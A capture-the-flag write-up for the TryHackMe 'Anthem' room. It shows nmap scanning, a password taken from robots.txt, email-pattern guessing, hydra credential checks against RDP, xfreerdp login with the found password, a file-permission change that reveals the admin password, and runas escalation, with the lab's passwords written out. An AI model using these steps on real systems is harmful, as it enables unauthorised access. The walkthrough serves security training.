## Solution

### Task 1: Website Analysis

#### Check for services with nmap

We start by scanning the machine with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Anthem]
└─$ export TARGET_IP=10.65.174.49                                                                                                            

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Anthem]
└─$ sudo nmap -sV -sC -Pn $TARGET_IP

```

We have two services running:

- Microsoft httpd 2.0 on port 80
- Microsoft Terminal Services on port 3389

#### What port is for the web server?

Answer: `80`

#### WWhat port is for remote desktop service?

Answer: `3389`

### Check the web site

Next we manually check the web site on port 80 and find a blog

![Web Page on Anthem](Images/Web_Page_on_Anthem.png)

Checking for comments with `nmap` gives us nothing

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Anthem]
└─$ nmap -v -p80 --script http-comments-displayer -Pn $TARGET_IP

And in the `robots.txt` file we find the following

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Anthem]
└─$ curl http://$TARGET_IP/robots.txt

# Use for all search robots

# Define the directories not to crawl

```

Whatweb gives us the following general information

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Anthem]
└─$ whatweb -a 3 $TARGET_IP

```

#### What is a possible password in one of the pages web crawlers check for?

Hint: fill in the gap ******.txt

Answer: `UmbracoIsTheBest!`

#### What CMS is the website using?

Answer: `Umbraco`

#### What is the domain of the website?

Answer: `anthem.com`

#### What's the name of the Administrator

Hint: Consult the Oracle. (your favourite search engine)

Googling for the poem found on this blog page `http://10.65.174.49/archive/a-cheers-to-our-it-department/`

```text
Born on a Monday,
Christened on Tuesday,
Married on Wednesday,
Took ill on Thursday,
Grew worse on Friday,
Died on Saturday,
Buried on Sunday.
That was the end...
```

gives us this [Wikipedia information](https://en.wikipedia.org/wiki/Solomon_Grundy_(nursery_rhyme)).

Answer: `Solomon Grundy`

#### Can we find find the email address of the administrator?

Hint: There is another email address on the website that should help us figuring out the email pattern used by the administrator.

On the "We are hiring" blog page (`http://10.65.174.49/archive/we-are-hiring/`) we find Jane Doe's email which is `JD@anthem.com`.

So Solomon's email ought to be `SG@anthem.com`.

Answer: `SG@anthem.com`

### Task 2: Spot the flags

Our beloved admin left some flags behind that we require to gather before we proceed to the next task...

Anthem are hiring!

#### What is flag 1?

Hint: Have we inspected the pages yet?

In the HTML-source of the "We are hiring" blog page at `http://10.65.174.49/archive/we-are-hiring/` we find the first flag at the beginning of the source:

```html
<!DOCTYPE html>

    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />

<meta content="THM{<REDACTED>}" property="og:description" />
<!--- snip --->
```

Answer: `THM{<REDACTED>}`

#### What is flag 2?

Hint: Search for it

Further down on the same page we find the second flag in the HTML form:

```html
<!--- snip --->
    <form method="get" action="/search">
        <input type="text" name="term" placeholder="Search...                    THM{<REDACTED>}" />
        <button type="submit" class="fa fa-search fa"></button>
    </form>
<!--- snip --->
```

Answer: `THM{<REDACTED>}`

#### What is flag 3?

Hint: Profile

The third flag is found on Jane Doe's profile at `http://10.65.174.49/authors/jane-doe/`

![Jane Does Profile on Anthem](Images/Jane_Does_Profile_on_Anthem.png)

Answer: `THM{<REDACTED>}`

#### What is flag 4?

Hint: Have we inspected all the pages yet?

The fourth flag is found in the HTML source of the blog page "A cheers to our IT department" (`http://10.65.174.49/archive/a-cheers-to-our-it-department/`)

```html
<!DOCTYPE html>

<meta content="THM{<REDACTED>}" property="og:description" />
<!--- snip --->
```

Answer: `THM{<REDACTED>}`

### Task 3: Final stage

Let's get into the box using the intel we gathered.

Let's figure out the username and password to log in to the box.

Of the gathered information we have a possible password of `UmbracoIsTheBest!`.

For the username it could be:

- `SG`
- `sg`
- `SG@anthem.com`
- `sg@anthem.com`

We create a small file with these candidates

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Anthem]
└─$ vi usernames.txt                                 

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Anthem]
└─$ cat usernames.txt
sg
SG
SG@anthem.com
sg@anthem.com

```

And verifies the username with `hydra`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Anthem]
└─$ hydra -L usernames.txt -p 'UmbracoIsTheBest!' rdp://$TARGET_IP                    
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-03 15:46:16

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-03 15:46:42
```

Now we can connect with our credentials

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Anthem]
└─$ xfreerdp /v:$TARGET_IP /cert:ignore /u:sg /p:'UmbracoIsTheBest!' /h:1024 /w:1500 +clipboard 
[15:48:45:232] [210499:210500] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32

<---snip--->
```

#### What is the contents of user.txt?

The user.txt flag file can be found on the Desktop.

Answer: `THM{<REDACTED>}`

#### Can we spot the admin password?

Hint: It is hidden.

Let's assume the password is stored in a text (`.txt`) file.

We can search for all `.txt` files with `where`

```bat
C:\Users\SG>where /R C:\ *.txt
C:\backup\restore.txt
C:\inetpub\wwwroot\Web\robots.txt
C:\inetpub\wwwroot\Web\App_Data\Logs\UmbracoTraceLog.WIN-LU09299160F.txt
C:\inetpub\wwwroot\Web\App_Data\TEMP\DistCache\LMW3SVC1ROOT-lastsynced.txt
C:\inetpub\wwwroot\Web\App_Data\TEMP\DistCache\LMW3SVC2ROOT-lastsynced.txt
C:\inetpub\wwwroot\Web\bin\amd64\Microsoft.VC90.CRT\README_ENU.txt
C:\inetpub\wwwroot\Web\bin\x86\Microsoft.VC90.CRT\README_ENU.txt
<---snip--->
```

The `C:\backup\restore.txt` sounds like a promising file. Let's check it out.

```bat
C:\Users\SG>type C:\backup\restore.txt
Access is denied.
```

We don't have permissions to read it. But maybe we can give ourselves access to it?

Browse to the file in Explorer.exe (don't forget the enable viwe Hidden items) and give all local Users full access to the file.

![File Access Config on Anthem](Images/File_Access_Config_on_Anthem.png)

Then we can read the file with the Admin password

```bat
C:\Users\SG>type C:\backup\restore.txt
ChangeMeBaby1MoreTime
```

Answer: `ChangeMeBaby1MoreTime`

#### Escalate your privileges to root, what is the contents of root.txt?

With the Admin password we can execute `runas.exe` to get an elevated command shell

```bat
C:\Users\SG>runas.exe /user:Administrator cmd.exe
Enter the password for Administrator:
Attempting to start cmd.exe as user "WIN-LU09299160F\Administrator" ...
```

In the new cmd.exe window we can now search for the `root.txt` flag

```bat
C:\Windows\system32>where /R C:\Users root.txt
C:\Users\Administrator\Desktop\root.txt

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
THM{<REDACTED>}
```
